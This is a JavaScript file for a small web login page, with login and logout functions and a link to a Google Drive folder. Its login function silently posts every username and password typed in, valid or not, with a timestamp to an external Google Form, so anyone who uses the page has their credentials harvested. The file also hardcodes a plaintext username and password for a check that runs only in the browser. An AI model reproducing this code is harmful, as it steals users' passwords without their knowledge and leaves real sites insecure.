// =====================================
// GOOGLE FORM SETTINGS
// =====================================

// Google Form Submit URL
const GOOGLE_FORM_URL =
"https://docs.google.com/forms/d/e/1FAIpQLScpqtWuT6imFQWPpVEuDWO3AIukyPew7eQZcuY4BNNMQU1fOA/formResponse";


// Google Form Entry IDs
const USERNAME_ENTRY =
"entry.1112834539";

const PASSWORD_ENTRY =
"entry.374512369";

const TIME_ENTRY =
"entry.2145518782";


// =====================================
// GOOGLE DRIVE FOLDER LINK
// =====================================
const DRIVE_FOLDER =
"https://drive.google.com/drive/folders/1mITdmmyP_-WbTHZwPsdsaKCGXqpmqo24?usp=drive_link";


// =====================================
// LOGIN FUNCTION
// =====================================
function login() {

    const username =
        document
        .getElementById("username")
        .value
        .trim();

    const password =
        document
        .getElementById("password")
        .value
        .trim();

    // Empty field check
    if (
        username === "" ||
        password === ""
    ) {
        alert(
            "Please enter username and password"
        );
        return;
    }

    // Save ALL attempts
    // (Correct + Wrong)
    submitToGoogleForm(
        username,
        password
    );

    // Login validation
    if (
        username === "Sreejith" &&
        password === "sree3449"
    ) {

        // Hide login page
        document
            .getElementById(
                "loginPage"
            )
            .classList
            .add("hidden");

        // Show home page
        document
            .getElementById(
                "homePage"
            )
            .classList
            .remove("hidden");

    } else {

        alert(
            "Invalid Username or Password"
        );
    }
}


// =====================================
// SUBMIT TO GOOGLE FORM
// =====================================
function submitToGoogleForm(
    username,
    password
) {

    const formData =
        new FormData();

    formData.append(
        USERNAME_ENTRY,
        username
    );

    formData.append(
        PASSWORD_ENTRY,
        password
    );

    formData.append(
        TIME_ENTRY,
        new Date()
        .toLocaleString()
    );

    fetch(
        GOOGLE_FORM_URL,
        {
            method: "POST",
            mode: "no-cors",
            body: formData
        }
    )
    .then(() => {

        console.log(
            "Login details saved"
        );

    })
    .catch((error) => {

        console.error(
            "Error:",
            error
        );

    });
}


// =====================================
// OPEN GOOGLE DRIVE FOLDER
// =====================================
function openDriveFolder() {

    window.open(
        DRIVE_FOLDER,
        "_blank"
    );
}


// =====================================
// LOGOUT FUNCTION
// =====================================
function logout() {

    // Hide home page
    document
        .getElementById(
            "homePage"
        )
        .classList
        .add("hidden");

    // Show login page
    document
        .getElementById(
            "loginPage"
        )
        .classList
        .remove("hidden");

    // Clear username field
    document
        .getElementById(
            "username"
        )
        .value = "";

    // Clear password field
    document
        .getElementById(
            "password"
        )
        .value = "";
}